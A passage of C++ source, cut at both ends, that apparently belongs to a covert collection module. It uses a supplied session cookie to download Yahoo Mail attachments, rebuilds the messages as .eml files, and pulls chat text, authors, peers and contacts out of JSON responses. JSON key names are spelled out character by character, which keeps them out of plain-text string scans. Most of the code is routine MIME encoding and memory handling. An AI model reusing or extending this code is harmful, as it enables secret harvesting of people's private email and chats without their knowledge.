		//convert the multi-byte string to the wchar string
		mbstowcs_s(&dwConv, strConv, (dwLineLen+1), &strTmp[(i*dwLineLen)], dwLen);
		//add the wchar string to the attachment buffer
		wcscpy(*pStr+j, strConv);
		//add CRLF
		wcscpy(*pStr+j+(dwConv-1), L"\r\n\0");

		//nr of total converted bytes
		dwTotConv += (dwConv-1);
	}

	//free heap and set to null
	znfree((LPVOID*)&strConv);
	znfree((LPVOID*)&strTmp);

	return YAHOO_SUCCESS;
}


//encode an attachment with the algorithm specified
DWORD YHEncodeAttachment(LPYAHOO_MAIL_ATTACHMENT pAttachment, LPWSTR strEncodingAlg)
{
	LPSTR strTmp = NULL;
	DWORD dwEncSize, dwNewSize, dwLines, dwLen, dwLineLen=72;
	size_t dwConv;

	if((pAttachment->strAttachment == NULL) || (pAttachment->dwSize == 0))
		return YAHOO_ERROR;

	if(!_wcsicmp(strEncodingAlg, L"base64"))
	{
		//encode the attachment
		strTmp = base64_encode((LPBYTE)pAttachment->strAttachment, pAttachment->dwSize);
		if(strTmp == NULL)		
			return YAHOO_ALLOC_ERROR;
		
		dwEncSize = strlen(strTmp);
	}
	else
	{
		return YAHOO_ERROR;
	}

	//determine the number of lines
	dwLines = ((int)(dwEncSize / dwLineLen)) + 1;
	dwNewSize = dwEncSize + (dwLines*2) + 1;	//add 2 chars for each line, to store the CRLF bytes

	//alloc mem for the encoded attachment + (CRLF*nOfLines)
	pAttachment->strEncodedAttachment = (LPWSTR)zalloc(dwNewSize * sizeof(WCHAR));
	if(pAttachment->strEncodedAttachment == NULL)
	{
		znfree((LPVOID*)&strTmp);
		return YAHOO_ALLOC_ERROR;
	}

	SecureZeroMemory(pAttachment->strEncodedAttachment, dwNewSize * sizeof(WCHAR));

	//alloc a temp buffer for conversion
	LPWSTR strConv = (LPWSTR)zalloc((dwLineLen+1) * sizeof(WCHAR));
	if(strConv == NULL)
	{
		znfree((LPVOID*)&strTmp);
		znfree((LPVOID*)&pAttachment->strAttachment);
		znfree((LPVOID*)&pAttachment->strEncodedAttachment);
		return YAHOO_ALLOC_ERROR;
	}
	dwLen = dwLineLen;

	//add CRLF to attachment
	for(DWORD i=0, j=0, dwTotConv=0; i<dwLines; i++)
	{
		j = (i * dwLineLen) + ((i * 2));

		if((dwEncSize-dwTotConv) < dwLen)
		{
			dwLen = dwEncSize-dwTotConv;
		}

		//convert the multi-byte string to the wchar string
		mbstowcs_s(&dwConv, strConv, (dwLineLen+1), &strTmp[(i*dwLineLen)], dwLen);
		//add the wchar string to the attachment buffer
		wcscpy(&pAttachment->strEncodedAttachment[j], strConv);
		//add CRLF
		wcscpy(&pAttachment->strEncodedAttachment[j+(dwConv-1)], L"\r\n\0");

		//nr of total converted bytes
		dwTotConv += (dwConv-1);
	}

	//free heap and set to null
	znfree((LPVOID*)&strConv);
	znfree((LPVOID*)&strTmp);
	znfree((LPVOID*)&pAttachment->strAttachment);

	return YAHOO_SUCCESS;
}


//request the mail associated to an email ID
DWORD YHGetMailAttachment(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPYAHOO_MAIL_FIELDS pYHMailFields, LPSTR strCookie, LPYAHOO_MAIL_ATTACHMENT pAttachment)
{
	LPSTR   strRecvBuffer	= NULL;
	LPSTR   strEncoded		= NULL;
	LPWSTR	strURI			= NULL;
	DWORD	dwRet, dwBufferSize;

	//get mail body
	strURI = (LPWSTR)zalloc(YAHOO_ALLOC_SIZE*sizeof(WCHAR));
	if(strURI == NULL)
		return YAHOO_ALLOC_ERROR;

	strEncoded = EncodeURL(strMailID);
	if(strEncoded == NULL)
	{
		znfree((LPVOID*)&strURI);
		return YAHOO_ERROR;
	}

	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE, L"/ya/download?mid=%S&fid=%s&pid=%s&tnef=&clean=0", strEncoded, pYHParams->strMailFolder, pYHMailFields->strPartId);
	znfree((LPVOID*)&strEncoded);

	//command to retrieve the attachment
	dwRet = HttpSocialRequest(pYHParams->strServerName, L"GET", strURI, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie);
	znfree((LPVOID*)&strURI);

	if(dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		//free heap		
		znfree((LPVOID*)&strRecvBuffer);

		return YAHOO_ERROR;
	}

	//save the attachment
	pAttachment->strAttachment = (LPSTR)malloc(dwBufferSize);
	if(pAttachment->strAttachment != NULL)
	{	
		memcpy_s(pAttachment->strAttachment, dwBufferSize, strRecvBuffer, dwBufferSize);
		pAttachment->dwSize = dwBufferSize;

		//encode the attachment
		dwRet = YHEncodeAttachment(pAttachment, pYHMailFields->strEncoding);
	}
	else
		dwRet = YAHOO_ALLOC_ERROR;

	//free heap
	znfree((LPVOID*)&strRecvBuffer);

	return dwRet;
}


//assemble email according to eml format
DWORD YHAssembleMail(LPSTR strMailHeader, LPSTR strMailBody, LPSTR *strMail)
{
	DWORD dwSize = 0;

	if(strMailHeader == NULL)
		return YAHOO_ERROR;
	
	dwSize += strlen(strMailHeader);

	if(strMailBody != NULL)
		dwSize += strlen(strMailBody);

	if(dwSize == 0)
		return YAHOO_ERROR;

	//add CRLF between the header and the body
	dwSize += 4;

	//total size of the mail
//	dwSize = strlen(strMailHeader) + strlen(strMailBody) + 2 + 2; //add CRLF between the header and the body

	*strMail = (LPSTR)zalloc(dwSize);
	if(*strMail == NULL)
		return YAHOO_ALLOC_ERROR;
	SecureZeroMemory(*strMail, dwSize);
	
	if(strMailBody != NULL)
		sprintf_s(*strMail, dwSize, "%s\r\n%s", strMailHeader, strMailBody);
	else
		sprintf_s(*strMail, dwSize, "%s", strMailHeader);

	return YAHOO_SUCCESS;
}


//search for boundary value for multipart mails
//(es: boundary="----=_NextPart_1CF_1D5C_7951AA2F.3FAEF881")
void YHGetBoundaryValue(LPWSTR strHeader, LPWSTR * strBoundary)
{
	LPWSTR pSubFrom, pSubTo;
	DWORD dwLen;

	pSubFrom = wcsstr(strHeader, L"boundary=");
	if(pSubFrom != NULL)
	{
		pSubFrom += 10;
		pSubTo = wcsstr(pSubFrom, L"\"");
		if(pSubTo != NULL)
		{
			dwLen = (pSubTo-pSubFrom) + 1;
			*strBoundary = (LPWSTR)malloc(dwLen*sizeof(WCHAR));
			if(*strBoundary == NULL)
				return;

			wcsncpy_s(*strBoundary, dwLen, pSubFrom, dwLen-1);
		}
	}
}


//add a new section to the mail
DWORD YHAddSectionText(LPWSTR *strMail, LPYAHOO_MAIL_FIELDS pFields)
{
	LPWSTR strQP	= NULL;
	DWORD  dwMailSize;

/*
	strField = (LPWSTR)malloc(YAHOO_ALLOC_SIZE*sizeof(WCHAR));
	if(strField == NULL)
		return YAHOO_ALLOC_ERROR;
*/
	//mail body size
	if(*strMail != NULL)
		dwMailSize = wcslen(*strMail);
	else
		dwMailSize = 0;

	//(text)
	if(pFields->strText != NULL)
	{
		if(!_wcsicmp(pFields->strEncoding, L"quoted-printable"))
		{
			//buffer convertion to quoted-printable
			if(AsciiBufToQP(pFields->strText, wcslen(pFields->strText)+1, &strQP) != YAHOO_SUCCESS)
			{				
				znfree((LPVOID*)&strQP);
				return YAHOO_ALLOC_ERROR;
			}

			//text
			if(ReallocAndAppendString(strMail, strQP) != YAHOO_SUCCESS)
			{
				znfree((LPVOID*)strMail);
				znfree((LPVOID*)&strQP);
				return YAHOO_ALLOC_ERROR;
			}

			//free memory
			znfree((LPVOID*)&strQP);
		}
		else if(!_wcsicmp(pFields->strEncoding, L"base64"))
		{
			//base64 encoding
			if(AsciiBufToBase64(&pFields->strText, pFields->strEncoding) != YAHOO_SUCCESS)
			{				
				znfree((LPVOID*)&pFields->strText);
				return YAHOO_ALLOC_ERROR;
			}

			//text
			if(ReallocAndAppendString(strMail, pFields->strText) != YAHOO_SUCCESS)
			{
				znfree((LPVOID*)strMail);
				return YAHOO_ALLOC_ERROR;
			}			
		}
		else
		{
			//text
			if(ReallocAndAppendString(strMail, pFields->strText) != YAHOO_SUCCESS)
			{
				znfree((LPVOID*)strMail);
				return YAHOO_ALLOC_ERROR;
			}
		}

		//wcscpy(strField, L"\r\n");
		if(ReallocAndAppendString(strMail, L"\r\n") != YAHOO_SUCCESS)
		{
			znfree((LPVOID*)strMail);
			return YAHOO_ALLOC_ERROR;
		}
	}

	return YAHOO_SUCCESS;
}


//add a section header to the mail
DWORD YHAddSectionHeader(LPWSTR *strMail, LPYAHOO_MAIL_FIELDS pFields)
{
	LPWSTR strField	= NULL;
	DWORD  dwMailSize;
	BOOL   bUTF8 = FALSE, bBoundary = FALSE;	

	strField = (LPWSTR)malloc(YAHOO_ALLOC_SIZE * sizeof(WCHAR));
	if(strField == NULL)
		return YAHOO_ALLOC_ERROR;

	//mail body size
	if(*strMail != NULL)
		dwMailSize = wcslen(*strMail);
	else
		dwMailSize = 0;

	//Content-Type: (type/subtype)
	if(pFields->strType != NULL)
	{
		swprintf_s(strField, YAHOO_ALLOC_SIZE, L"Content-Type: %s/%s; ", pFields->strType, pFields->strSubType);
		if(ReallocAndAppendString(strMail, strField) != YAHOO_SUCCESS)
		{
			znfree((LPVOID*)strMail);
			znfree((LPVOID*)&strField);
			return YAHOO_ALLOC_ERROR;
		}
	}

	//\t(typeParams)
	if(pFields->strTypeParams != NULL)
	{
		WCHAR *pStr = wcsstr(pFields->strTypeParams, L"charset");
		BOOL bFound = FALSE;
		int i=0;
		
		//if the charset is != UTF-8, use the UTF-8 charset because it's the one used by json arrays
		//(in json structure the data are always encoded with the UTF-8 charset)
		if((pFields->strTypeParams != NULL) && 
			(pStr != NULL) &&
			(!wcsstr(pFields->strTypeParams, L"UTF-8")))
		{
			//search the end of the charset field to see if there are more information
			for(i=0; pStr[i]!=0; i++)
			{
				if(pStr[i] == ';')
				{
					pStr = &pStr[i+1];
					bFound = TRUE;
					break;
				}
			}

			//set the charset field
			if(bFound)
			{
				swprintf_s(strField, YAHOO_ALLOC_SIZE, L"\t%s; %s\r\n", L"charset=UTF-8", pStr);
				bUTF8 = TRUE;
			}
			else
				swprintf_s(strField, YAHOO_ALLOC_SIZE, L"\t%s\r\n", L"charset=UTF-8");
		}
		else
		{						
			pStr = wcsstr(pFields->strTypeParams, L"boundary=");
			if(pStr != NULL)
				bBoundary = TRUE;

			swprintf_s(strField, YAHOO_ALLOC_SIZE, L"\r\n\t%s\r\n", pFields->strTypeParams);
		}
		
		if(ReallocAndAppendString(strMail, strField) != YAHOO_SUCCESS)
		{
			znfree((LPVOID*)strMail);
			znfree((LPVOID*)&strField);
			return YAHOO_ALLOC_ERROR;
		}
		
		if(bBoundary == TRUE)
		{						
			wcscpy(strField, L"\r\n");
			if(ReallocAndAppendString(strMail, strField) != YAHOO_SUCCESS)
			{			
				znfree((LPVOID*)strMail);
				znfree((LPVOID*)&strField);
				return YAHOO_ALLOC_ERROR;
			}

			znfree((LPVOID*)&strField);
			return YAHOO_SUCCESS;
		}
		
	}	

	//Content-Disposition: (di	position)
	if(pFields->strDisposition != NULL)
	{
		swprintf_s(strField, YAHOO_ALLOC_SIZE, L"Content-Disposition: %s\r\n", pFields->strDisposition);
		if(ReallocAndAppendString(strMail, strField) != YAHOO_SUCCESS)
		{
			znfree((LPVOID*)strMail);
			znfree((LPVOID*)&strField);
			return YAHOO_ALLOC_ERROR;
		}		
	}

	//Content-Transfer-Encoding: (encoding)
	if(pFields->strEncoding != NULL)
	{
		//if the charset was forced to UTF-8, then modify the encoding field from 7bit to 8bit
		if((bUTF8) && (wcsstr(pFields->strEncoding, L"7bit")))
			swprintf_s(strField, YAHOO_ALLOC_SIZE, L"Content-Transfer-Encoding: %s\r\n", L"8bit");
		else
			swprintf_s(strField, YAHOO_ALLOC_SIZE, L"Content-Transfer-Encoding: %s\r\n", pFields->strEncoding);

		if(ReallocAndAppendString(strMail, strField) != YAHOO_SUCCESS)
		{
			znfree((LPVOID*)strMail);
			znfree((LPVOID*)&strField);
			return YAHOO_ALLOC_ERROR;
		}
	}

	/*
		//Content-ID: <(cid value)>
		if(pFields->strCids != NULL)
		{
			swprintf_s(strField, YAHOO_ALLOC_SIZE, L"Content-ID: <%s>\r\n", pFields->strCids);
			if(ReallocAndAppendString(strField, strMail) != YAHOO_SUCCESS)
			{
				znfree((LPVOID*)&strField);
				return YAHOO_ALLOC_ERROR;
			}
		}
	*/

	wcscpy(strField, L"\r\n");
	if(ReallocAndAppendString(strMail, strField) != YAHOO_SUCCESS)
	{
		znfree((LPVOID*)strMail);
		znfree((LPVOID*)&strField);
		return YAHOO_ALLOC_ERROR;
	}

	//free heap
	znfree((LPVOID*)&strField);

	return YAHOO_SUCCESS;
}

//add mail and section boundaries
DWORD YHAddMailBoundary(LPWSTR *strMail, LPYAHOO_MAIL_BOUNDARIES lpMailBoundaries, BOOL bCloseSection)
{
	LPWSTR strField = NULL;
	DWORD  dwCurrBoundary;
	
	strField = (LPWSTR)malloc(YAHOO_ALLOC_SIZE*sizeof(WCHAR));
	if(strField == NULL)
		return YAHOO_ALLOC_ERROR;

	dwCurrBoundary = lpMailBoundaries->dwCurrentItem;

	if(lpMailBoundaries->lpBoundaries == NULL)
	{
		znfree((LPVOID*)&strField);
		return YAHOO_SUCCESS;
	}

	if(bCloseSection == TRUE)
	{
		//write the section boundary, if present
		swprintf_s(strField, YAHOO_ALLOC_SIZE, L"--%s--\r\n\r\n", lpMailBoundaries->lpBoundaries[dwCurrBoundary]->strBoundary);

		//remove the closed boundary from memory
		YHDelBoundary(lpMailBoundaries->lpBoundaries, dwCurrBoundary);
		if(lpMailBoundaries->dwCurrentItem	> 0)
			lpMailBoundaries->dwCurrentItem	-= 1;
		if(lpMailBoundaries->dwTotItems	> 0)
			lpMailBoundaries->dwTotItems	-= 1;
	}
	else
	{
		//boundary start (two '-' characters must be used as a prefix for the boundary value)
		swprintf_s(strField, YAHOO_ALLOC_SIZE, L"--%s\r\n", lpMailBoundaries->lpBoundaries[dwCurrBoundary]->strBoundary);
	}
	
	//append the boundary to the mail
	if(ReallocAndAppendString(strMail, strField) != YAHOO_SUCCESS)
	{
		znfree((LPVOID*)strMail);
		znfree((LPVOID*)&strField);
		return YAHOO_ALLOC_ERROR;
	}

	//free heap memory
	znfree((LPVOID*)&strField);

	return YAHOO_SUCCESS;
}


//realloc the buffer and append the string
DWORD ReallocAndAppendString(__out LPWSTR *pBuffer, __in LPWSTR pwcsStrToAppend, __in LPWSTR pwcsStrAdd /*=NULL*/)
{	
	LPWSTR pOldBuf = NULL;
	DWORD dwNewSize, dwSize, dwBufSize;

	if(pwcsStrToAppend == NULL)
		return YAHOO_SUCCESS;

	//size of the string to append
	dwSize = wcslen(pwcsStrToAppend);

	//add size of string 2, if present
	if(pwcsStrAdd != NULL)
		dwSize += wcslen(pwcsStrAdd);

	//current buffer size
	if(*pBuffer == NULL)
		dwBufSize = 0;
	else
		dwBufSize = wcslen(*pBuffer);

	dwNewSize = ((dwBufSize + dwSize) * sizeof(WCHAR)) + sizeof(WCHAR);

	pOldBuf = *pBuffer;
	*pBuffer = (LPWSTR)realloc(*pBuffer, dwNewSize);
	if(*pBuffer == NULL)
	{
		znfree((LPVOID*)&pOldBuf);
		return YAHOO_ALLOC_ERROR;
	}

	((*pBuffer)[dwBufSize]) = 0; //null 

	//cat the string
	wcscat_s(*pBuffer, (dwBufSize + dwSize + 1), pwcsStrToAppend);

	//cat the second string, if present
	if(pwcsStrAdd != NULL)
		wcscat_s(*pBuffer, (dwBufSize + dwSize + 1), pwcsStrAdd);

	return YAHOO_SUCCESS;
}

/*
//realloc the buffer and append the string
DWORD ReallocAndAppendString(LPWSTR pwcsStrToAppend, LPWSTR *pBuffer)
{	
	LPWSTR pOldBuf = NULL;
	DWORD dwNewSize, dwSize, dwBufSize;

	if(pwcsStrToAppend == NULL)
		return YAHOO_SUCCESS;

	//size of the string to append
	dwSize = wcslen(pwcsStrToAppend);

	//current buffer size
	if(*pBuffer == NULL)
		dwBufSize = 0;
	else
		dwBufSize = wcslen(*pBuffer);

	dwNewSize = ((dwBufSize + dwSize) * sizeof(WCHAR)) + sizeof(WCHAR);

	pOldBuf = *pBuffer;
	*pBuffer = (LPWSTR)realloc(*pBuffer, dwNewSize);
	if(*pBuffer == NULL)
	{
		znfree((LPVOID*)&pOldBuf);
		return YAHOO_ALLOC_ERROR;
	}

	((*pBuffer)[dwBufSize]) = 0; //null 

	//add the new section
	wcscat_s(*pBuffer, (dwBufSize + dwSize + 1), pwcsStrToAppend);

	return YAHOO_SUCCESS;
}
*/

DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LPYAHOO_MAIL_BOUNDARIES lpMailBoundaries)
{
	//parse the returned json tree
	JSONArray	jArray;		
	DWORD		dwLen;// dwSize;
	WCHAR		strBuffer[128];
	WCHAR		*pwsSub;
	BOOL		bTextSection  = FALSE;

	//json obj and arrays
	WCHAR strHeaders[]			= { L'r', L'a', L'w', L'h', L'e', L'a', L'd', L'e', L'r', L's', L'\0' };							//array
	WCHAR strRoot[]				= { L'r', L'e', L's', L'u', L'l', L't', L'\0' };													//object

	WCHAR strDispositionFld[]	= { L'd', L'i', L's', L'p', L'o', L's', L'i', L't', L'i', L'o', L'n', L'\0' };						//value
	WCHAR strEncodingFld[]		= { L'e', L'n', L'c', L'o', L'd', L'i', L'n', L'g', L'\0' };										//value
	WCHAR strFilenameFld[]		= { L'f', L'i', L'l', L'e', L'n', L'a', L'm', L'e', L'\0' };										//value
	WCHAR strPartIdFld[]		= { L'p', L'a', L'r', L't', L'I', L'd', L'\0' };													//value	
	WCHAR strRefCidsFld[]		= { L'r', L'e', L'f', L'e', L'r', L'e', L'n', L'c', L'e', L'd', L'C', L'i', L'd', L's', L'\0' };	//value
	WCHAR strSubTypeFld[]		= { L's', L'u', L'b', L't', L'y', L'p', L'e', L'\0' };												//value
	WCHAR strTextFld[]			= { L't', L'e', L'x', L't', L'\0' };																//value
	WCHAR strTypeFld[]			= { L't', L'y', L'p', L'e', L'\0' };																//value
	WCHAR strTypeParamsFld[]	= { L't', L'y', L'p', L'e', L'P', L'a', L'r', L'a', L'm', L's', L'\0' };							//value
	

	//yhfix
	if(!jMail[strPartIdFld]->IsString())
		return YAHOO_SKIP;

	//get the obj part
	_snwprintf_s(strBuffer, sizeof(strBuffer)/2, _TRUNCATE, L"%s", jMail[strPartIdFld]->AsString().c_str());

	//get obj values
	if(!wcscmp(strBuffer, L"HEADER"))
		return YAHOO_SKIP;

	//get partid field
	dwLen = wcsnlen_s(jMail[strPartIdFld]->AsString().c_str(), _TRUNCATE);
	if(dwLen > 0)
	{
		lpMailFields->strPartId = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR)); 
		if(lpMailFields->strPartId == NULL)
			return YAHOO_ALLOC_ERROR;
		wcscpy_s(lpMailFields->strPartId, dwLen+1, jMail[strPartIdFld]->AsString().c_str());
	}

	//get subtype field
	dwLen = wcsnlen_s(jMail[strSubTypeFld]->AsString().c_str(), _TRUNCATE);
	if(dwLen > 0)
	{
		lpMailFields->strSubType = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR));
		if(lpMailFields->strSubType == NULL)
			return YAHOO_ALLOC_ERROR;
		wcscpy_s(lpMailFields->strSubType, dwLen+1, jMail[strSubTypeFld]->AsString().c_str());
	}

	//get type field
	dwLen = wcsnlen_s(jMail[strTypeFld]->AsString().c_str(), _TRUNCATE);
	if(dwLen > 0)
	{
		lpMailFields->strType = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR)); 
		if(lpMailFields->strType == NULL)
			return YAHOO_ALLOC_ERROR;
		wcscpy_s(lpMailFields->strType, dwLen+1, jMail[strTypeFld]->AsString().c_str());
	}

	//get encoding field
	dwLen = wcsnlen_s(jMail[strEncodingFld]->AsString().c_str(), _TRUNCATE);
	if(dwLen > 0)
	{
		lpMailFields->strEncoding = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR)); 
		if(lpMailFields->strEncoding == NULL)
			return YAHOO_ALLOC_ERROR;
		wcscpy_s(lpMailFields->strEncoding, dwLen+1, jMail[strEncodingFld]->AsString().c_str());
	}

	//get disposition field
	dwLen = wcsnlen_s(jMail[strDispositionFld]->AsString().c_str(), _TRUNCATE);
	if(dwLen > 0)
	{
		lpMailFields->strDisposition = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR)); 
		if(lpMailFields->strDisposition == NULL)
			return YAHOO_ALLOC_ERROR;
		wcscpy_s(lpMailFields->strDisposition, dwLen+1, jMail[strDispositionFld]->AsString().c_str());
	}

/*
	//get referenced cids (for inline pictures)
	if(jMail[strRefCidsFld]->IsObject())
	{
		JSONObject jObj = jMail[strRefCidsFld]->AsObject();

		dwLen = wcsnlen_s(jObj[0]->AsString().c_str(), _TRUNCATE);
		if(dwLen > 0)
		{
			pYHMailFields->strCids = (LPWSTR)zalloc((dwLen * sizeof(WCHAR)) + 2);
			if(pYHMailFields->strCids == NULL)
				return YAHOO_ALLOC_ERROR;
			wcscpy_s(pYHMailFields->strCids, dwLen+1, jObj[0]->AsString().c_str());
		}
	}
*/

	//get param type field
	dwLen = wcsnlen_s(jMail[strTypeParamsFld]->AsString().c_str(), _TRUNCATE);
	if(dwLen > 0)
	{
		lpMailFields->strTypeParams = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR));
		if(lpMailFields->strTypeParams != NULL)
		{
			//verify if it's a boundary value
			pwsSub = wcsstr((WCHAR*)jMail[strTypeParamsFld]->AsString().c_str(), L"boundary=");
			if(pwsSub != NULL)
			{
				if(lpMailBoundaries != NULL)
				{
					//alloc size for boundaries
					lpMailBoundaries->dwTotItems += 1;
					if(YHAddBoundary(&lpMailBoundaries->lpBoundaries, lpMailBoundaries->dwTotItems, pwsSub, lpMailFields->strPartId) == YAHOO_ALLOC_ERROR)
						return YAHOO_ALLOC_ERROR;

					lpMailBoundaries->dwCurrentItem = lpMailBoundaries->dwTotItems-1;										
				}
			}

			//type params
			wcscpy_s(lpMailFields->strTypeParams, dwLen+1, jMail[strTypeParamsFld]->AsString().c_str());
		}
		else
			return YAHOO_ALLOC_ERROR;
	}

	//get text field
	dwLen = wcsnlen_s(jMail[strTextFld]->AsString().c_str(), _TRUNCATE);
	if(dwLen > 0)
	{
		lpMailFields->strText = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR));
		if(lpMailFields->strText == NULL)
			return YAHOO_ALLOC_ERROR;
		wcscpy_s(lpMailFields->strText, dwLen+1, jMail[strTextFld]->AsString().c_str());
	}

/*
	#ifdef _DEBUG
		if(lpMailFields->strText != NULL)
		{
//			wcstombs_s((size_t*)&dwSize, strFullBody, dwLen+1, pYHMailFields->strText, _TRUNCATE);

			dwSize = WideCharToMultiByte(CP_UTF8, 0, lpMailFields->strText, -1, 0, 0, 0, 0);
			
			//alloc dest buffer
			LPSTR strFullBody = (LPSTR)malloc(dwSize+1);
			if(strFullBody == NULL)
				return YAHOO_ALLOC_ERROR;

			//conversion
			dwSize = WideCharToMultiByte(CP_UTF8, 0, lpMailFields->strText, -1, strFullBody, dwSize, 0, 0);

			//write the email part
			DumpYHTcpData(L"k:\\mail_text.txt", strFullBody, dwLen);

			znfree((LPVOID*)&strFullBody);
		}
	#endif
*/
/*
	//if it's the TEXT section, save content-type parameter
	if(pYHMailFields->strPartId != NULL)
	{
		if(!wcscmp(pYHMailFields->strPartId, L"TEXT"))
		{
			dwLen = wcsnlen_s(pYHMailFields->strType, _TRUNCATE) + wcsnlen_s(pYHMailFields->strSubType, _TRUNCATE) + (sizeof(WCHAR) * 2);
			if(dwLen > 0)
			{
				pYHMailFields->strHeaderType = (LPWSTR)zalloc(dwLen);
				swprintf(pYHMailFields->strHeaderType, dwLen, L"%s/%s", pYHMailFields->strType, pYHMailFields->strSubType);
			}
		}
	}
*/

	return YAHOO_SUCCESS;
}


DWORD YHExtractChatFields(JSONObject jMail, LPYAHOO_CHAT_FIELDS lpChatFields)
{
	//parse the returned json tree
	JSONArray  jArray;		
	DWORD	dwLen; //dwSize;
	WCHAR   strBuffer[128];

	//json
	WCHAR strPartIdFld[]	= { L'p', L'a', L'r', L't', L'I', L'd', L'\0' };		//value
	WCHAR strSubTypeFld[]	= { L's', L'u', L'b', L't', L'y', L'p', L'e', L'\0' };	//value
	WCHAR strTextFld[]		= { L't', L'e', L'x', L't', L'\0' };					//value
	WCHAR strTypeFld[]		= { L't', L'y', L'p', L'e', L'\0' };					//value	
	

	//yhfix
	if(!jMail[strPartIdFld]->IsString())
		return YAHOO_SKIP;

	//get the obj part
	_snwprintf_s(strBuffer, sizeof(strBuffer)/2, _TRUNCATE, L"%s", jMail[strPartIdFld]->AsString().c_str());

	//get obj values
	if(!wcscmp(strBuffer, L"HEADER"))
		return YAHOO_SKIP;

	//get subtype field
	dwLen = wcsnlen_s(jMail[strSubTypeFld]->AsString().c_str(), _TRUNCATE);
	if(dwLen > 0)
	{
		lpChatFields->strSubType = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR));
		if(lpChatFields->strSubType == NULL)
			return YAHOO_ALLOC_ERROR;
		wcscpy_s(lpChatFields->strSubType, dwLen+1, jMail[strSubTypeFld]->AsString().c_str());
	}

	//get type field
	dwLen = wcsnlen_s(jMail[strTypeFld]->AsString().c_str(), _TRUNCATE);
	if(dwLen > 0)
	{
		lpChatFields->strType = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR)); 
		if(lpChatFields->strType == NULL)
			return YAHOO_ALLOC_ERROR;
		wcscpy_s(lpChatFields->strType, dwLen+1, jMail[strTypeFld]->AsString().c_str());
	}

	//get text field
	dwLen = wcsnlen_s(jMail[strTextFld]->AsString().c_str(), _TRUNCATE);
	if(dwLen > 0)
	{
		lpChatFields->strText = (LPWSTR)zalloc((dwLen+1) * sizeof(WCHAR));
		if(lpChatFields->strText == NULL)
			return YAHOO_ALLOC_ERROR;
		wcscpy_s(lpChatFields->strText, dwLen+1, jMail[strTextFld]->AsString().c_str());
	}

	return YAHOO_SUCCESS;
}

/*
//extract the numeric part of the part id field
//part id is a string like 1.1, 1.2, 1.1.1 ecc..
DWORD YHExtractPartID(LPWSTR strPartID, DWORD *dwPartID)
{
	LPSTR strTmp = NULL;
	DWORD i, j;

	//alloc tmp string
	strTmp = (LPWSTR)zalloc(wcslen(strPartID) + 1);
	if(strTmp == NULL)
		return YAHOO_ALLOC_ERROR;

	//extract the non-numeric values from the partid
	for(i=0, j=0; strPartID[i]!=0; i++)
	{		
		if((strPartID[i] >= '0') && (strPartID[i] <= '9'))
			strTmp[j++] = strPartID[i];
	}
	strTmp[j] = 0;

	*dwPartID = atoi(strTmp);

	return YAHOO_SUCCESS;
}
*/

//create an array of boundaries
DWORD YHAddBoundary(LPYAHOO_MAIL_BOUNDARY** pBoundaries, DWORD nItems, LPWSTR strBoundary, LPWSTR strPartID)
{
	LPYAHOO_MAIL_BOUNDARY* pOld = NULL;	
	DWORD dwSize, nCurItem;

	dwSize = sizeof(LPYAHOO_MAIL_BOUNDARY) * nItems;

	//realloc the boundaries array
	pOld = *pBoundaries;
	*pBoundaries = (LPYAHOO_MAIL_BOUNDARY*)realloc(*pBoundaries, dwSize);
	if(*pBoundaries == NULL)
	{	
		free(pOld);
		return YAHOO_ALLOC_ERROR;
	}

	nCurItem = nItems-1;

	//current item	
	//alloc the boundary structure
	(*pBoundaries)[nCurItem] = (LPYAHOO_MAIL_BOUNDARY)zalloc(sizeof(YAHOO_MAIL_BOUNDARY));

	//save the boundary in the boundary array
	YHGetBoundaryValue(strBoundary, &((*pBoundaries)[nCurItem]->strBoundary));

/*
	//alloc the boundary string
	dwSize = wcslen(strBoundary) + 1;
	(*pBoundaries)[nCurItem]->strBoundary = (LPWSTR)zalloc(dwSize * sizeof(WCHAR));
	//save the boundary
	wcscpy_s((*pBoundaries)[nCurItem]->strBoundary, dwSize, strBoundary);
*/

	//alloc the partid string
	dwSize = wcslen(strPartID) + 1;
	(*pBoundaries)[nCurItem]->strPartID = (LPWSTR)zalloc(dwSize * sizeof(WCHAR));
	//save the boundary
	wcscpy_s((*pBoundaries)[nCurItem]->strPartID, dwSize, strPartID);


	return YAHOO_SUCCESS;
}


//delete the last boundar
DWORD YHDelBoundary(LPYAHOO_MAIL_BOUNDARY* pBoundaries, DWORD dwItem)
{
	//free boundary items
	znfree((LPVOID*)&pBoundaries[dwItem]->strBoundary);
	znfree((LPVOID*)&pBoundaries[dwItem]->strPartID);
	znfree((LPVOID*)&pBoundaries[dwItem]);

	return YAHOO_SUCCESS;
}

DWORD YHFreeBoundaries(LPYAHOO_MAIL_BOUNDARIES lpMailBoundaries)
{	
	DWORD i;

	for(i=0; i<lpMailBoundaries->dwTotItems; i++)
	{
		//free boundary items
		znfree((LPVOID*)&lpMailBoundaries->lpBoundaries[i]->strBoundary);
		znfree((LPVOID*)&lpMailBoundaries->lpBoundaries[i]->strPartID);
		znfree((LPVOID*)&lpMailBoundaries->lpBoundaries[i]);
	}

	znfree((LPVOID*)&lpMailBoundaries->lpBoundaries);

	return YAHOO_SUCCESS;
}


//structure memory deallocation
DWORD YHFreeChatFields(LPYAHOO_CHAT_FIELDS pFields)
{	
	znfree((LPVOID*)&pFields->strMailUser);
	znfree((LPVOID*)&pFields->strAuthor);
	znfree((LPVOID*)&pFields->strAuthorID);
	znfree((LPVOID*)&pFields->strPeers);
	znfree((LPVOID*)&pFields->strPeersID);
	znfree((LPVOID*)&pFields->strSubType);
	znfree((LPVOID*)&pFields->strText);
	znfree((LPVOID*)&pFields->strType);	

	return SOCIAL_REQUEST_SUCCESS;
}


//structure memory deallocation
DWORD YHFreeContactFields(LPYAHOO_CONTACT_VALUES pFields)
{
	znfree((LPVOID*)&pFields->strCompany);
